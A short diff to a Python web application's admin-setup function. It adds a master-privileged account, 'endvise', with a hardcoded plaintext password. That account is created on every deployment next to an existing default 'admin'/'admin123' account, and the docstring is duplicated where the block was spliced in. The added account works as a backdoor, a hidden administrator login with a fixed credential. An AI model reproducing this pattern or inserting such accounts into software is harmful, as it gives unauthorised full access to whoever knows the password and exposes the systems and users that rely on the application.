@@ -61,6 +61,16 @@ def logout():
 
 def create_default_admin():
     """Create default admin user if not exists"""
+    existing = get_admin_by_username("endvise")
+    if not existing:
+        default_password = "a12503934!"
+        create_admin_user(
+            username="endvise",
+            nickname="MasterAdmin",
+            password_hash=hash_password(default_password),
+            is_master=True
+        )
+    """Create default admin user if not exists"""
     existing = get_admin_by_username("admin")
     if not existing:
         default_password = "admin123"  # Change in production
